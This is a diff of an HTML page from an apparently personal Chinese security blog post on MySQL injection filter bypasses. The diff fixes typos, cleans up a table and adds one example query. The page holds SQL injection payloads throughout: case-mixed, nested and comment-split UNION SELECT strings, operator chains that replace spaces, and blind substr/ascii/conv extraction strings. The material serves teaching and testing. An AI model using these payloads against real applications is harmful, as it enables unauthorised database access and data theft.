@@ -121,7 +121,7 @@
 <meta property="og:description" content="大小写绕过1?id=1+UnIoN+SeLecT`+1,2,3-- 替换绕过1?id=1+UNunionION+SEselectLECT+1,2,3-- 注释绕过1?id=1+un/**/ion+se/**/lect+1,2,3-- 特殊嵌入绕过1?id=1/*!UnIoN*/SeLecT+1,2,3-- 字符串格式12345&amp;apos; or &amp;quot;a&amp;quot;=&amp;apos;a&amp;apos">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://kidhat.github.io/2017/11/07/MySql注入-各种绕过姿势/类型转换.png">
-<meta property="og:updated_time" content="2017-11-07T09:38:14.627Z">
+<meta property="og:updated_time" content="2017-11-07T14:32:50.551Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="MySql注入-各种绕过姿势">
 <meta name="twitter:description" content="大小写绕过1?id=1+UnIoN+SeLecT`+1,2,3-- 替换绕过1?id=1+UNunionION+SEselectLECT+1,2,3-- 注释绕过1?id=1+un/**/ion+se/**/lect+1,2,3-- 特殊嵌入绕过1?id=1/*!UnIoN*/SeLecT+1,2,3-- 字符串格式12345&amp;apos; or &amp;quot;a&amp;quot;=&amp;apos;a&amp;apos">
@@ -436,19 +436,19 @@
 <tbody>
 <tr>
 <td>空格</td>
-<td>Information<em>schema . tables</em></td>
+<td>Information_schema . tables</td>
 </tr>
 <tr>
 <td>反引号</td>
-<td>informationschema.tables</td>
+<td>`information_schema`.`tables`</td>
 </tr>
 <tr>
 <td>特殊符</td>
-<td>/!Information_schema.tables/</td>
+<td>/*!Information_schema.tables*/</td>
 </tr>
 <tr>
 <td>别名</td>
-<td>Information_schema.partitions,statistics,key<em>column</em> usage,table_constraints</td>
+<td>information_schema.partitions<br>information_schema.statistics<br>information_schema.key_column_usage<br>information_schema.table_constraints</td>
 </tr>
 </tbody>
 </table>
@@ -531,7 +531,7 @@
 <p>Example:</p><p></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;/p&gt;UNION(SELECT(column)FROM(table))</div></pre></td></tr></table></figure>
 <h3 id="and-or后插入字符绕过空格"><a href="#and-or后插入字符绕过空格" class="headerlink" title="and/or后插入字符绕过空格"></a>and/or后插入字符绕过空格</h3><p>任意混合+ - ~ !可以达到绕过空格的效果（可以现在本地测试，混合后需要的奇偶数可能不同）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SELECTDISTINCT(db) FROM mysql.db WHERE`Host`=&quot;localhost&quot; and-++-1=1;需要偶数个--</div><div class="line">SELECTDISTINCT(db) FROM mysql.db WHERE`Host`=&quot;localhost&quot; and!! ~~~~!1=1;需要奇数个！</div></pre></td></tr></table></figure></p>
-<p>其实一下的字符都可以测试</p>
+<p>其实以下的字符都可以测试</p>
 <table>
 <thead>
 <tr>
@@ -566,6 +566,7 @@
 </tr>
 </tbody>
 </table>
+<p>Example:<br><code>SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))</code> #dual是一个用于测试的虚拟表</p>
 <h3 id="注释符-amp-引号"><a href="#注释符-amp-引号" class="headerlink" title="注释符&amp;引号"></a>注释符&amp;引号</h3><p>SELECTDISTINCT(db) FROM mysql.db WHERE Host=”localhost” and<code>/**/</code>1=1;<br>SELECT DISTINCT(db) FROM mysql.db WHERE Host=<code>&#39;localhost&#39;</code> and&quot;1=1&quot;;</p>
 <h1 id="函数过滤绕过"><a href="#函数过滤绕过" class="headerlink" title="函数过滤绕过"></a>函数过滤绕过</h1><p>构建字符串相关函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">unhex char hex ascii ord substr substring mid pad left right insert</div><div class="line">&apos; and substr(data,1,1) = &apos;a&apos;#</div><div class="line">&apos; and substr(data,1,1) = 0x61# 0x6162</div><div class="line">&apos; and substr(data,1,1) = unhex(61)# unhex(6162)</div><div class="line">&apos; and substr(data,1,1) = char(97)# char(97,98)</div><div class="line">&apos; and hex(substr(data,1,1)) = 61#</div><div class="line">&apos; and ascii(substr(data,1,1)) = 97#</div><div class="line">&apos; and ord(substr(data,1,1)) = 97#</div></pre></td></tr></table></figure></p>
 <p>使用conv来进行进制的转换<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&apos; and substr(data,1,1) = lower(conv(10,10,36))# &apos;a&apos;</div><div class="line">&apos; and substr(data,1,1) = lower(conv(11,10,36))# &apos;b&apos;</div><div class="line">&apos; and substr(data,1,1) = lower(conv(36,10,36))# &apos;z&apos;</div></pre></td></tr></table></figure></p>
